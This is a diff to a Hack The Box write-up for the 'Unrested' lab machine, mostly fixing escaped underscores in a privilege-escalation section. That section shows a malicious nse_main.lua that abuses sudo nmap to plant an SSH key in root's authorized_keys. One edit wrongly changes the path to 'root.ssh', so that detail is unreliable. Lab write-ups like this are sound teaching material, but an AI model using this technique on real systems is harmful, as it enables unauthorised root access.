@@ -202,22 +202,22 @@ We look through the standard path **`/usr/share/nmap`** and discover several scr
 
 
 
-Now that we have all the information we need to escalate our privileges with sudo nmap, we need to decide on a method to grant ourselves root access. We decide to do so by inserting our freshly made SSH key into the **`authorized\_keys`** file in the **`root/.ssh`** directory.
+Now that we have all the information we need to escalate our privileges with sudo nmap, we need to decide on a method to grant ourselves root access. We decide to do so by inserting our freshly made SSH key into the **`authorized_keys`** file in the **`root.ssh`** directory.
 
 First, we need to create a small **ECDSA 256-bit SSH key**.
 ```
 ┌──(kali㉿kali)-[~/HTB/Machines/Unrested]
-└─$ ssh-keygen -t ecdsa -b 256 -f root\_ecdsa\_key
+└─$ ssh-keygen -t ecdsa -b 256 -f root_ecdsa_key
 Generating public/private ecdsa key pair.
-Enter passphrase for "root\_ecdsa\_key" (empty for no passphrase): 
+Enter passphrase for "root_ecdsa_key" (empty for no passphrase): 
 Enter same passphrase again: 
-Your identification has been saved in root\_ecdsa\_key
-Your public key has been saved in root\_ecdsa\_key.pub
+Your identification has been saved in root_ecdsa_key
+Your public key has been saved in root_ecdsa_key.pub
 ```
 
 We now create the malicious script in **`/tmp/`** containing our payload that echoes our public key into the root's **`authorized_keys`** file.
 
-``echo 'os.execute("echo '<public ssh key>' > /root/.ssh/authorized\_keys")' > /tmp/nse\_main.lua``
+``echo 'os.execute("echo '<public ssh key>' > /root/.ssh/authorized_keys")' > /tmp/nse_main.lua``
 
 
 After successfully creating the malicious **`nse_main.lua`**, we can execute the nmap script with the following command:
